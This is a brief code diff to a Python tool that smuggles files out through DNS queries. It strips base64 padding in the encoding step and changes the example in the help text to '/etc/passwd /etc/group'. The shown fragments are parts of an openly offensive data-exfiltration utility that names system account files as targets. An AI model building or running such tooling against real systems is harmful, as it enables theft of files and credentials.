@@ -77,7 +77,7 @@ class FileExfiltrator(threading.Thread):
 
         temp_file = tempfile.SpooledTemporaryFile()
     
-        temp_file.write(encoded_file_data.encode('utf-8'))
+        temp_file.write(encoded_file_data.rstrip('=').encode('utf-8'))
         temp_file.seek(0) # Return to beginning of temporary file
         
         file_size = len(temp_file.read())
@@ -269,7 +269,7 @@ def main():
     parser.add_argument('-s', '--socket', action="store", dest="socket", default=None,
                         help="The upstream server for making DNS requests and the port (eg. '-s 127.0.0.1:53')")
     parser.add_argument('-f','--file', nargs="+", dest="file",
-                        help="File to exfiltrate (eg. '-f /etc/passwd')")
+                        help="File to exfiltrate (eg. '-f /etc/passwd /etc/group')")
     parser.add_argument('-d', '--domain', action="store", dest="domain",
                         help="The domain to make requests for. (eg. '-d test.com')")
     args = parser.parse_args()
